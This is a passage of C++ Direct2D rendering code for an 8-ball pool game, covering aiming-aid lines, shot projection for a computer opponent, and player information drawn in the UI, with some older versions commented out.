    /*void DrawBalls(ID2D1RenderTarget* pRT) {
        ID2D1SolidColorBrush* pBrush = nullptr;
        ID2D1SolidColorBrush* pStripeBrush = nullptr; // For stripe pattern

        pRT->CreateSolidColorBrush(D2D1::ColorF(0, 0, 0), &pBrush); // Placeholder
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pStripeBrush);

        if (!pBrush || !pStripeBrush) {
            SafeRelease(&pBrush);
            SafeRelease(&pStripeBrush);
            return;
        }


        for (size_t i = 0; i < balls.size(); ++i) {
            const Ball& b = balls[i];
            if (!b.isPocketed) {
                D2D1_ELLIPSE ellipse = D2D1::Ellipse(D2D1::Point2F(b.x, b.y), BALL_RADIUS, BALL_RADIUS);

                // Set main ball color
                pBrush->SetColor(b.color);
                pRT->FillEllipse(&ellipse, pBrush);

                // Draw Stripe if applicable
                if (b.type == BallType::STRIPE) {
                    // Draw a white band across the middle (simplified stripe)
                    D2D1_RECT_F stripeRect = D2D1::RectF(b.x - BALL_RADIUS, b.y - BALL_RADIUS * 0.4f, b.x + BALL_RADIUS, b.y + BALL_RADIUS * 0.4f);
                    // Need to clip this rectangle to the ellipse bounds - complex!
                    // Alternative: Draw two colored arcs leaving a white band.
                    // Simplest: Draw a white circle inside, slightly smaller.
                    D2D1_ELLIPSE innerEllipse = D2D1::Ellipse(D2D1::Point2F(b.x, b.y), BALL_RADIUS * 0.6f, BALL_RADIUS * 0.6f);
                    pRT->FillEllipse(innerEllipse, pStripeBrush); // White center part
                    pBrush->SetColor(b.color); // Set back to stripe color
                    pRT->FillEllipse(innerEllipse, pBrush); // Fill again, leaving a ring - No, this isn't right.

                    // Let's try drawing a thick white line across
                    // This doesn't look great. Just drawing solid red for stripes for now.
                }

                // Draw Number (Optional - requires more complex text layout or pre-rendered textures)
                // if (b.id != 0 && pTextFormat) {
                //     std::wstring numStr = std::to_wstring(b.id);
                //     D2D1_RECT_F textRect = D2D1::RectF(b.x - BALL_RADIUS, b.y - BALL_RADIUS, b.x + BALL_RADIUS, b.y + BALL_RADIUS);
                //     ID2D1SolidColorBrush* pNumBrush = nullptr;
                //     D2D1_COLOR_F numCol = (b.type == BallType::SOLID || b.id == 8) ? D2D1::ColorF(D2D1::ColorF::Black) : D2D1::ColorF(D2D1::ColorF::White);
                //     pRT->CreateSolidColorBrush(numCol, &pNumBrush);
                //     // Create a smaller text format...
                //     // pRT->DrawText(numStr.c_str(), numStr.length(), pSmallTextFormat, &textRect, pNumBrush);
                //     SafeRelease(&pNumBrush);
                // }
            }
        }

        SafeRelease(&pBrush);
        SafeRelease(&pStripeBrush);
    }*/


    /*void DrawAimingAids(ID2D1RenderTarget* pRT) {
        // Condition check at start (Unchanged)
        //if (currentGameState != PLAYER1_TURN && currentGameState != PLAYER2_TURN &&
            //currentGameState != BREAKING && currentGameState != AIMING)
        //{
            //return;
        //}
            // NEW Condition: Allow drawing if it's a human player's active turn/aiming/breaking,
        // OR if it's AI's turn and it's in AI_THINKING state (calculating) or BREAKING (aiming break).
        bool isHumanInteracting = (!isPlayer2AI || currentPlayer == 1) &&
            (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN ||
                currentGameState == BREAKING || currentGameState == AIMING);
        // AI_THINKING state is when AI calculates shot. AIMakeDecision sets cueAngle/shotPower.
        // Also include BREAKING state if it's AI's turn and isOpeningBreakShot for break aim visualization.
            // NEW Condition: AI is displaying its aim
        bool isAiVisualizingShot = (isPlayer2AI && currentPlayer == 2 &&
            currentGameState == AI_THINKING && aiIsDisplayingAim);

        if (!isHumanInteracting && !(isAiVisualizingShot || (currentGameState == AI_THINKING && aiIsDisplayingAim))) {
            return;
        }

        Ball* cueBall = GetCueBall();
        if (!cueBall || cueBall->isPocketed) return; // Don't draw if cue ball is gone

        ID2D1SolidColorBrush* pBrush = nullptr;
        ID2D1SolidColorBrush* pGhostBrush = nullptr;
        ID2D1StrokeStyle* pDashedStyle = nullptr;
        ID2D1SolidColorBrush* pCueBrush = nullptr;
        ID2D1SolidColorBrush* pReflectBrush = nullptr; // Brush for reflection line

        // Ensure render target is valid
        if (!pRT) return;

        // Create Brushes and Styles (check for failures)
        HRESULT hr;
        hr = pRT->CreateSolidColorBrush(AIM_LINE_COLOR, &pBrush);
        if FAILED(hr) { SafeRelease(&pBrush); return; }
        hr = pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.5f), &pGhostBrush);
        if FAILED(hr) { SafeRelease(&pBrush); SafeRelease(&pGhostBrush); return; }
        hr = pRT->CreateSolidColorBrush(D2D1::ColorF(0.6f, 0.4f, 0.2f), &pCueBrush);
        if FAILED(hr) { SafeRelease(&pBrush); SafeRelease(&pGhostBrush); SafeRelease(&pCueBrush); return; }
        // Create reflection brush (e.g., lighter shade or different color)
        hr = pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::LightCyan, 0.6f), &pReflectBrush);
        if FAILED(hr) { SafeRelease(&pBrush); SafeRelease(&pGhostBrush); SafeRelease(&pCueBrush); SafeRelease(&pReflectBrush); return; }
        // Create a Cyan brush for primary and secondary lines //orig(75.0f / 255.0f, 0.0f, 130.0f / 255.0f);indigoColor
        D2D1::ColorF cyanColor(0.0, 255.0, 255.0, 255.0f);
        ID2D1SolidColorBrush* pCyanBrush = nullptr;
        hr = pRT->CreateSolidColorBrush(cyanColor, &pCyanBrush);
        if (FAILED(hr)) {
            SafeRelease(&pCyanBrush);
            // handle error if needed
        }
        // Create a Purple brush for primary and secondary lines
        D2D1::ColorF purpleColor(255.0f, 0.0f, 255.0f, 255.0f);
        ID2D1SolidColorBrush* pPurpleBrush = nullptr;
        hr = pRT->CreateSolidColorBrush(purpleColor, &pPurpleBrush);
        if (FAILED(hr)) {
            SafeRelease(&pPurpleBrush);
            // handle error if needed
        }

        if (pFactory) {
            D2D1_STROKE_STYLE_PROPERTIES strokeProps = D2D1::StrokeStyleProperties();
            strokeProps.dashStyle = D2D1_DASH_STYLE_DASH;
            hr = pFactory->CreateStrokeStyle(&strokeProps, nullptr, 0, &pDashedStyle);
            if FAILED(hr) { pDashedStyle = nullptr; }
        }


        // --- Cue Stick Drawing (Unchanged from previous fix) ---
        const float baseStickLength = 150.0f;
        const float baseStickThickness = 4.0f;
        float stickLength = baseStickLength * 1.4f;
        float stickThickness = baseStickThickness * 1.5f;
        float stickAngle = cueAngle + PI;
        float powerOffset = 0.0f;
        //if (isAiming && (currentGameState == AIMING || currentGameState == BREAKING)) {
            // Show power offset if human is aiming/dragging, or if AI is preparing its shot (AI_THINKING or AI Break)
        if ((isAiming && (currentGameState == AIMING || currentGameState == BREAKING)) || isAiVisualizingShot) { // Use the new condition
            powerOffset = shotPower * 5.0f;
        }
        D2D1_POINT_2F cueStickEnd = D2D1::Point2F(cueBall->x + cosf(stickAngle) * (stickLength + powerOffset), cueBall->y + sinf(stickAngle) * (stickLength + powerOffset));
        D2D1_POINT_2F cueStickTip = D2D1::Point2F(cueBall->x + cosf(stickAngle) * (powerOffset + 5.0f), cueBall->y + sinf(stickAngle) * (powerOffset + 5.0f));
        pRT->DrawLine(cueStickTip, cueStickEnd, pCueBrush, stickThickness);


        // --- Projection Line Calculation ---
        float cosA = cosf(cueAngle);
        float sinA = sinf(cueAngle);
        float rayLength = TABLE_WIDTH + TABLE_HEIGHT; // Ensure ray is long enough
        D2D1_POINT_2F rayStart = D2D1::Point2F(cueBall->x, cueBall->y);
        D2D1_POINT_2F rayEnd = D2D1::Point2F(rayStart.x + cosA * rayLength, rayStart.y + sinA * rayLength);*/

    void DrawAimingAids(ID2D1RenderTarget* pRT) {
        // Determine if aiming aids should be drawn.
        bool isHumanInteracting = (!isPlayer2AI || currentPlayer == 1) &&
            (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN ||
                currentGameState == BREAKING || currentGameState == AIMING ||
                currentGameState == CHOOSING_POCKET_P1 || currentGameState == CHOOSING_POCKET_P2);

        // FOOLPROOF FIX: This is the new condition to show the AI's aim.
        bool isAiVisualizingShot = (isPlayer2AI && currentPlayer == 2 && aiIsDisplayingAim);

        if (!isHumanInteracting && !isAiVisualizingShot) {
            return;
        }

        Ball* cueBall = GetCueBall();
        if (!cueBall || cueBall->isPocketed) return;

        // --- Brush and Style Creation (No changes here) ---
        ID2D1SolidColorBrush* pBrush = nullptr;
        ID2D1SolidColorBrush* pGhostBrush = nullptr;
        ID2D1StrokeStyle* pDashedStyle = nullptr;
        ID2D1SolidColorBrush* pCueBrush = nullptr;
        ID2D1SolidColorBrush* pReflectBrush = nullptr;
        ID2D1SolidColorBrush* pCyanBrush = nullptr;
        ID2D1SolidColorBrush* pPurpleBrush = nullptr;
        pRT->CreateSolidColorBrush(AIM_LINE_COLOR, &pBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.5f), &pGhostBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(0.6f, 0.4f, 0.2f), &pCueBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::LightCyan, 0.6f), &pReflectBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Cyan), &pCyanBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Purple), &pPurpleBrush);
        if (pFactory) {
            D2D1_STROKE_STYLE_PROPERTIES strokeProps = D2D1::StrokeStyleProperties();
            strokeProps.dashStyle = D2D1_DASH_STYLE_DASH;
            pFactory->CreateStrokeStyle(&strokeProps, nullptr, 0, &pDashedStyle);
        }
        // --- End Brush Creation ---

        // --- FOOLPROOF FIX: Use the AI's planned angle and power for drawing ---
        float angleToDraw = cueAngle;
        float powerToDraw = shotPower;

        if (isAiVisualizingShot) {
            // When the AI is showing its aim, force the drawing to use its planned shot details.
            angleToDraw = aiPlannedShotDetails.angle;
            powerToDraw = aiPlannedShotDetails.power;
        }
        // --- End AI Aiming Fix ---

        // --- Cue Stick Drawing ---
        const float baseStickLength = 150.0f;
        const float baseStickThickness = 4.0f;
        float stickLength = baseStickLength * 1.4f;
        float stickThickness = baseStickThickness * 1.5f;
        float stickAngle = angleToDraw + PI; // Use the angle we determined
        float powerOffset = 0.0f;
        if ((isAiming || isDraggingStick) || isAiVisualizingShot) {
            powerOffset = powerToDraw * 5.0f; // Use the power we determined
        }
        D2D1_POINT_2F cueStickEnd = D2D1::Point2F(cueBall->x + cosf(stickAngle) * (stickLength + powerOffset), cueBall->y + sinf(stickAngle) * (stickLength + powerOffset));
        D2D1_POINT_2F cueStickTip = D2D1::Point2F(cueBall->x + cosf(stickAngle) * (powerOffset + 5.0f), cueBall->y + sinf(stickAngle) * (powerOffset + 5.0f));
        pRT->DrawLine(cueStickTip, cueStickEnd, pCueBrush, stickThickness);

        // --- Projection Line Calculation ---
        float cosA = cosf(angleToDraw); // Use the angle we determined
        float sinA = sinf(angleToDraw);
        float rayLength = TABLE_WIDTH + TABLE_HEIGHT;
        D2D1_POINT_2F rayStart = D2D1::Point2F(cueBall->x, cueBall->y);
        D2D1_POINT_2F rayEnd = D2D1::Point2F(rayStart.x + cosA * rayLength, rayStart.y + sinA * rayLength);

        // Find the first ball hit by the aiming ray
        Ball* hitBall = nullptr;
        float firstHitDistSq = -1.0f;
        D2D1_POINT_2F ballCollisionPoint = { 0, 0 }; // Point on target ball circumference
        D2D1_POINT_2F ghostBallPosForHit = { 0, 0 }; // Ghost ball pos for the hit ball

        hitBall = FindFirstHitBall(rayStart, cueAngle, firstHitDistSq);
        if (hitBall) {
            // Calculate the point on the target ball's circumference
            float collisionDist = sqrtf(firstHitDistSq);
            ballCollisionPoint = D2D1::Point2F(rayStart.x + cosA * collisionDist, rayStart.y + sinA * collisionDist);
            // Calculate ghost ball position for this specific hit (used for projection consistency)
            ghostBallPosForHit = D2D1::Point2F(hitBall->x - cosA * BALL_RADIUS, hitBall->y - sinA * BALL_RADIUS); // Approx.
        }

        // Find the first rail hit by the aiming ray
        D2D1_POINT_2F railHitPoint = rayEnd; // Default to far end if no rail hit
        float minRailDistSq = rayLength * rayLength;
        int hitRailIndex = -1; // 0:Left, 1:Right, 2:Top, 3:Bottom

        // Define table edge segments for intersection checks
        D2D1_POINT_2F topLeft = D2D1::Point2F(TABLE_LEFT, TABLE_TOP);
        D2D1_POINT_2F topRight = D2D1::Point2F(TABLE_RIGHT, TABLE_TOP);
        D2D1_POINT_2F bottomLeft = D2D1::Point2F(TABLE_LEFT, TABLE_BOTTOM);
        D2D1_POINT_2F bottomRight = D2D1::Point2F(TABLE_RIGHT, TABLE_BOTTOM);

        D2D1_POINT_2F currentIntersection;

        // Check Left Rail
        if (LineSegmentIntersection(rayStart, rayEnd, topLeft, bottomLeft, currentIntersection)) {
            float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
            if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 0; }
        }
        // Check Right Rail
        if (LineSegmentIntersection(rayStart, rayEnd, topRight, bottomRight, currentIntersection)) {
            float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
            if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 1; }
        }
        // Check Top Rail
        if (LineSegmentIntersection(rayStart, rayEnd, topLeft, topRight, currentIntersection)) {
            float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
            if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 2; }
        }
        // Check Bottom Rail
        if (LineSegmentIntersection(rayStart, rayEnd, bottomLeft, bottomRight, currentIntersection)) {
            float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
            if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 3; }
        }


        // --- Determine final aim line end point ---
        D2D1_POINT_2F finalLineEnd = railHitPoint; // Assume rail hit first
        bool aimingAtRail = true;

        if (hitBall && firstHitDistSq < minRailDistSq) {
            // Ball collision is closer than rail collision
            finalLineEnd = ballCollisionPoint; // End line at the point of contact on the ball
            aimingAtRail = false;
        }

        // --- Draw Primary Aiming Line ---
        pRT->DrawLine(rayStart, finalLineEnd, pBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);

        // --- Draw Target Circle/Indicator ---
        D2D1_ELLIPSE targetCircle = D2D1::Ellipse(finalLineEnd, BALL_RADIUS / 2.0f, BALL_RADIUS / 2.0f);
        pRT->DrawEllipse(&targetCircle, pBrush, 1.0f);

        // --- Draw Projection/Reflection Lines ---
        if (!aimingAtRail && hitBall) {
            // Aiming at a ball: Draw Ghost Cue Ball and Target Ball Projection
            D2D1_ELLIPSE ghostCue = D2D1::Ellipse(ballCollisionPoint, BALL_RADIUS, BALL_RADIUS); // Ghost ball at contact point
            pRT->DrawEllipse(ghostCue, pGhostBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);

            // Calculate target ball projection based on impact line (cue collision point -> target center)
            float targetProjectionAngle = atan2f(hitBall->y - ballCollisionPoint.y, hitBall->x - ballCollisionPoint.x);
            // Clamp angle calculation if distance is tiny
            if (GetDistanceSq(hitBall->x, hitBall->y, ballCollisionPoint.x, ballCollisionPoint.y) < 1.0f) {
                targetProjectionAngle = cueAngle; // Fallback if overlapping
            }

            D2D1_POINT_2F targetStartPoint = D2D1::Point2F(hitBall->x, hitBall->y);
            D2D1_POINT_2F targetProjectionEnd = D2D1::Point2F(
                hitBall->x + cosf(targetProjectionAngle) * 50.0f, // Projection length 50 units
                hitBall->y + sinf(targetProjectionAngle) * 50.0f
            );
            // Draw solid line for target projection
            //pRT->DrawLine(targetStartPoint, targetProjectionEnd, pBrush, 1.0f);

        //new code start

                    // Dual trajectory with edge-aware contact simulation
            D2D1_POINT_2F dir = {
                targetProjectionEnd.x - targetStartPoint.x,
                targetProjectionEnd.y - targetStartPoint.y
            };
            float dirLen = sqrtf(dir.x * dir.x + dir.y * dir.y);
            dir.x /= dirLen;
            dir.y /= dirLen;

            D2D1_POINT_2F perp = { -dir.y, dir.x };

            // Approximate cue ball center by reversing from tip
            D2D1_POINT_2F cueBallCenterForGhostHit = { // Renamed for clarity if you use it elsewhere
                targetStartPoint.x - dir.x * BALL_RADIUS,
                targetStartPoint.y - dir.y * BALL_RADIUS
            };

            // REAL contact-ball center - use your physics object's center:
            // (replace 'objectBallPos' with whatever you actually call it)
            // (targetStartPoint is already hitBall->x, hitBall->y)
            D2D1_POINT_2F contactBallCenter = targetStartPoint; // Corrected: Use the object ball's actual center
            //D2D1_POINT_2F contactBallCenter = D2D1::Point2F(hitBall->x, hitBall->y);

           // The 'offset' calculation below uses 'cueBallCenterForGhostHit' (originally 'cueBallCenter').
           // This will result in 'offset' being 0 because 'cueBallCenterForGhostHit' is defined
           // such that (targetStartPoint - cueBallCenterForGhostHit) is parallel to 'dir',
           // and 'perp' is perpendicular to 'dir'.
           // Consider Change 2 if this 'offset' is not behaving as intended for the secondary line.
            /*float offset = ((targetStartPoint.x - cueBallCenterForGhostHit.x) * perp.x +
                (targetStartPoint.y - cueBallCenterForGhostHit.y) * perp.y);*/
                /*float offset = ((targetStartPoint.x - cueBallCenter.x) * perp.x +
                    (targetStartPoint.y - cueBallCenter.y) * perp.y);
                float absOffset = fabsf(offset);
                float side = (offset >= 0 ? 1.0f : -1.0f);*/

                // Use actual cue ball center for offset calculation if 'offset' is meant to quantify the cut
            D2D1_POINT_2F actualCueBallPhysicalCenter = D2D1::Point2F(cueBall->x, cueBall->y); // This is also rayStart

            // Offset calculation based on actual cue ball position relative to the 'dir' line through targetStartPoint
            float offset = ((targetStartPoint.x - actualCueBallPhysicalCenter.x) * perp.x +
                (targetStartPoint.y - actualCueBallPhysicalCenter.y) * perp.y);
            float absOffset = fabsf(offset);
            float side = (offset >= 0 ? 1.0f : -1.0f);


            // Actual contact point on target ball edge
            D2D1_POINT_2F contactPoint = {
            contactBallCenter.x + perp.x * BALL_RADIUS * side,
            contactBallCenter.y + perp.y * BALL_RADIUS * side
            };

            // Tangent (cut shot) path from contact point
                // Tangent (cut shot) path: from contact point to contact ball center
            D2D1_POINT_2F objectBallDir = {
                contactBallCenter.x - contactPoint.x,
                contactBallCenter.y - contactPoint.y
            };
            float oLen = sqrtf(objectBallDir.x * objectBallDir.x + objectBallDir.y * objectBallDir.y);
            if (oLen != 0.0f) {
                objectBallDir.x /= oLen;
                objectBallDir.y /= oLen;
            }

            const float PRIMARY_LEN = 150.0f; //default=150.0f
            const float SECONDARY_LEN = 150.0f; //default=150.0f
            const float STRAIGHT_EPSILON = BALL_RADIUS * 0.05f;

            D2D1_POINT_2F primaryEnd = {
                targetStartPoint.x + dir.x * PRIMARY_LEN,
                targetStartPoint.y + dir.y * PRIMARY_LEN
            };

            // Secondary line starts from the contact ball's center
            D2D1_POINT_2F secondaryStart = contactBallCenter;
            D2D1_POINT_2F secondaryEnd = {
                secondaryStart.x + objectBallDir.x * SECONDARY_LEN,
                secondaryStart.y + objectBallDir.y * SECONDARY_LEN
            };

            if (absOffset < STRAIGHT_EPSILON)  // straight shot?
            {
                // Straight: secondary behind primary
                        // secondary behind primary {pDashedStyle param at end}
                pRT->DrawLine(secondaryStart, secondaryEnd, pPurpleBrush, 2.0f);
                //pRT->DrawLine(secondaryStart, secondaryEnd, pGhostBrush, 1.0f);
                pRT->DrawLine(targetStartPoint, primaryEnd, pCyanBrush, 2.0f);
                //pRT->DrawLine(targetStartPoint, primaryEnd, pBrush, 1.0f);
            }
            else
            {
                // Cut shot: both visible
                        // both visible for cut shot
                pRT->DrawLine(secondaryStart, secondaryEnd, pPurpleBrush, 2.0f);
                //pRT->DrawLine(secondaryStart, secondaryEnd, pGhostBrush, 1.0f);
                pRT->DrawLine(targetStartPoint, primaryEnd, pCyanBrush, 2.0f);
                //pRT->DrawLine(targetStartPoint, primaryEnd, pBrush, 1.0f);
            }
            // End improved trajectory logic

        //new code end

            // -- Cue Ball Path after collision (Optional, requires physics) --
            // Very simplified: Assume cue deflects, angle depends on cut angle.
            // float cutAngle = acosf(cosf(cueAngle - targetProjectionAngle)); // Angle between paths
            // float cueDeflectionAngle = ? // Depends on cutAngle, spin, etc. Hard to predict accurately.
            // D2D1_POINT_2F cueProjectionEnd = ...
            // pRT->DrawLine(ballCollisionPoint, cueProjectionEnd, pGhostBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);

            // --- Accuracy Comment ---
            // Note: The visual accuracy of this projection, especially for cut shots (hitting the ball off-center)
            // or shots with spin, is limited by the simplified physics model. Real pool physics involves
            // collision-induced throw, spin transfer, and cue ball deflection not fully simulated here.
            // The ghost ball method shows the *ideal* line for a center-cue hit without spin.

        }
        else if (aimingAtRail && hitRailIndex != -1) {
            // Aiming at a rail: Draw reflection line
            float reflectAngle = cueAngle;
            // Reflect angle based on which rail was hit
            if (hitRailIndex == 0 || hitRailIndex == 1) { // Left or Right rail
                reflectAngle = PI - cueAngle; // Reflect horizontal component
            }
            else { // Top or Bottom rail
                reflectAngle = -cueAngle; // Reflect vertical component
            }
            // Normalize angle if needed (atan2 usually handles this)
            while (reflectAngle > PI) reflectAngle -= 2 * PI;
            while (reflectAngle <= -PI) reflectAngle += 2 * PI;


            float reflectionLength = 60.0f; // Length of the reflection line
            D2D1_POINT_2F reflectionEnd = D2D1::Point2F(
                finalLineEnd.x + cosf(reflectAngle) * reflectionLength,
                finalLineEnd.y + sinf(reflectAngle) * reflectionLength
            );

            // Draw the reflection line (e.g., using a different color/style)
            pRT->DrawLine(finalLineEnd, reflectionEnd, pReflectBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);
        }

        // Release resources
        SafeRelease(&pBrush);
        SafeRelease(&pGhostBrush);
        SafeRelease(&pCueBrush);
        SafeRelease(&pReflectBrush); // Release new brush
        SafeRelease(&pCyanBrush);
        SafeRelease(&pPurpleBrush);
        SafeRelease(&pDashedStyle);
    }


    void DrawUI(ID2D1RenderTarget* pRT) {
        if (!pTextFormat || !pLargeTextFormat) return;

        ID2D1SolidColorBrush* pBrush = nullptr;
        pRT->CreateSolidColorBrush(UI_TEXT_COLOR, &pBrush);
        if (!pBrush) return;

        //new code
        // --- Always draw AI's 8?Ball call arrow when it's Player?2's turn and AI has called ---
        //if (isPlayer2AI && currentPlayer == 2 && calledPocketP2 >= 0) {
            // FIX: This condition correctly shows the AI's called pocket arrow.
        if (isPlayer2AI && IsPlayerOnEightBall(2) && calledPocketP2 >= 0) {
            // pocket index that AI called
            int idx = calledPocketP2;
            // draw large blue arrow
            ID2D1SolidColorBrush* pArrow = nullptr;
            pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrow);
            if (pArrow) {
                auto P = pocketPositions[idx];
                D2D1_POINT_2F tri[3] = {
                    { P.x - 15.0f, P.y - 40.0f },
                    { P.x + 15.0f, P.y - 40.0f },
                    { P.x       , P.y - 10.0f }
                };
                ID2D1PathGeometry* geom = nullptr;
                pFactory->CreatePathGeometry(&geom);
                ID2D1GeometrySink* sink = nullptr;
                geom->Open(&sink);
                sink->BeginFigure(tri[0], D2D1_FIGURE_BEGIN_FILLED);
                sink->AddLines(&tri[1], 2);
                sink->EndFigure(D2D1_FIGURE_END_CLOSED);
                sink->Close();
                pRT->FillGeometry(geom, pArrow);
                SafeRelease(&sink);
                SafeRelease(&geom);
                SafeRelease(&pArrow);
            }
            // draw “Choose a pocket...” prompt
            D2D1_RECT_F txt = D2D1::RectF(
                TABLE_LEFT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 5.0f,
                TABLE_RIGHT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 30.0f
            );
            pRT->DrawText(
                L""AI has called this pocket"",
                (UINT32)wcslen(L""AI has called this pocket""),
                pTextFormat,
                &txt,
                pBrush
            );
            // note: no return here — we still draw fouls/turn text underneath
        }
        //end new code

        // --- Player Info Area (Top Left/Right) --- (Unchanged)
        float uiTop = TABLE_TOP - 80;
        float uiHeight = 60;
        float p1Left = TABLE_LEFT;
        float p1Width = 150;
        float p2Left = TABLE_RIGHT - p1Width;
        D2D1_RECT_F p1Rect = D2D1::RectF(p1Left, uiTop, p1Left + p1Width, uiTop + uiHeight);
        D2D1_RECT_F p2Rect = D2D1::RectF(p2Left, uiTop, p2Left + p1Width, uiTop + uiHeight);

        // Player 1 Info Text (Unchanged)
        std::wostringstream oss1;
        oss1 << player1Info.name.c_str() << L""\n"";
        if (player1Info.assignedType != BallType::NONE) {
            oss1 << ((player1Info.assignedType == BallType::SOLID) ? L""Solids (Yellow)"" : L""Stripes (Red)"");
            oss1 << L"" ["" << player1Info.ballsPocketedCount << L""/7]"";
        }
        else {
            oss1 << L""(Undecided)"";
        }
        pRT->DrawText(oss1.str().c_str(), (UINT32)oss1.str().length(), pTextFormat, &p1Rect, pBrush);
        // Draw Player 1 Side Ball
        if (player1Info.assignedType != BallType::NONE)
        {
            ID2D1SolidColorBrush* pBallBrush = nullptr;
            D2D1_COLOR_F ballColor = (player1Info.assignedType == BallType::SOLID) ?
                D2D1::ColorF(1.0f, 1.0f, 0.0f) : D2D1::ColorF(1.0f, 0.0f, 0.0f);
            pRT->CreateSolidColorBrush(ballColor, &pBallBrush);
            if (pBallBrush)
            {
                D2D1_POINT_2F ballCenter = D2D1::Point2F(p1Rect.right + 10.0f, p1Rect.top + 20.0f);
                float radius = 10.0f;
                D2D1_ELLIPSE ball = D2D1::Ellipse(ballCenter, radius, radius);
                pRT->FillEllipse(&ball, pBallBrush);
                SafeRelease(&pBallBrush);
                // Draw border around the ball
                ID2D1SolidColorBrush* pBorderBrush = nullptr;
                pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pBorderBrush);
                if (pBorderBrush)
                {
                    pRT->DrawEllipse(&ball, pBorderBrush, 1.5f); // thin border
                    SafeRelease(&pBorderBrush);
                }

                // If stripes, draw a stripe band
                if (player1Info.assignedType == BallType::STRIPE)
                {
                    ID2D1SolidColorBrush* pStripeBrush = nullptr;
                    pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pStripeBrush);
                    if (pStripeBrush)
                    {
                        D2D1_RECT_F stripeRect = D2D1::RectF(
                            ballCenter.x - radius,
                            ballCenter.y - 3.0f,
                            ballCenter.x + radius,
                            ballCenter.y + 3.0f
                        );
                        pRT->FillRectangle(&stripeRect, pStripeBrush);
                        SafeRelease(&pStripeBrush);
                    }
                }
            }
        }


        // Player 2 Info Text (Unchanged)
        std::wostringstream oss2;
        oss2 << player2Info.name.c_str() << L""\n"";
        if (player2Info.assignedType != BallType::NONE) {
            oss2 << ((player2Info.assignedType == BallType::SOLID) ? L""Solids (Yellow)"" : L""Stripes (Red)"");
            oss2 << L"" ["" << player2Info.ballsPocketedCount << L""/7]"";
        }
        else {
            oss2 << L""(Undecided)"";
        }
        pRT->DrawText(oss2.str().c_str(), (UINT32)oss2.str().length(), pTextFormat, &p2Rect, pBrush);
        // Draw Player 2 Side Ball
        if (player2Info.assignedType != BallType::NONE)
        {
            ID2D1SolidColorBrush* pBallBrush = nullptr;
            D2D1_COLOR_F ballColor = (player2Info.assignedType == BallType::SOLID) ?
                D2D1::ColorF(1.0f, 1.0f, 0.0f) : D2D1::ColorF(1.0f, 0.0f, 0.0f);
            pRT->CreateSolidColorBrush(ballColor, &pBallBrush);
            if (pBallBrush)
            {
                D2D1_POINT_2F ballCenter = D2D1::Point2F(p2Rect.right + 10.0f, p2Rect.top + 20.0f);
                float radius = 10.0f;
                D2D1_ELLIPSE ball = D2D1::Ellipse(ballCenter, radius, radius);
                pRT->FillEllipse(&ball, pBallBrush);
                SafeRelease(&pBallBrush);
                // Draw border around the ball
                ID2D1SolidColorBrush* pBorderBrush = nullptr;
                pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pBorderBrush);
                if (pBorderBrush)
                {
                    pRT->DrawEllipse(&ball, pBorderBrush, 1.5f); // thin border
                    SafeRelease(&pBorderBrush);
                }

                // If stripes, draw a stripe band
                if (player2Info.assignedType == BallType::STRIPE)
                {
                    ID2D1SolidColorBrush* pStripeBrush = nullptr;
                    pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pStripeBrush);
                    if (pStripeBrush)
                    {
                        D2D1_RECT_F stripeRect = D2D1::RectF(
                            ballCenter.x - radius,
                            ballCenter.y - 3.0f,
                            ballCenter.x + radius,
                            ballCenter.y + 3.0f
                        );
                        pRT->FillRectangle(&stripeRect, pStripeBrush);
                        SafeRelease(&pStripeBrush);
                    }
                }
            }
        }

        // --- MODIFIED: Current Turn Arrow (Blue, Bigger, Beside Name) ---
        ID2D1SolidColorBrush* pArrowBrush = nullptr;
        pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrowBrush);
        if (pArrowBrush && currentGameState != GAME_OVER && currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
            float arrowSizeBase = 32.0f; // Base size for width/height offsets (4x original ~8)
            float arrowCenterY = p1Rect.top + uiHeight / 2.0f; // Center vertically with text box
            float arrowTipX, arrowBackX;

            D2D1_RECT_F playerBox = (currentPlayer == 1) ? p1Rect : p2Rect;
            arrowBackX = playerBox.left - 25.0f;
            arrowTipX = arrowBackX + arrowSizeBase * 0.75f;

            float notchDepth = 12.0f;  // Increased from 6.0f to make the rectangle longer
            float notchWidth = 10.0f;

            float cx = arrowBackX;
            float cy = arrowCenterY;

            // Define triangle + rectangle tail shape
            D2D1_POINT_2F tip = D2D1::Point2F(arrowTipX, cy);                           // tip
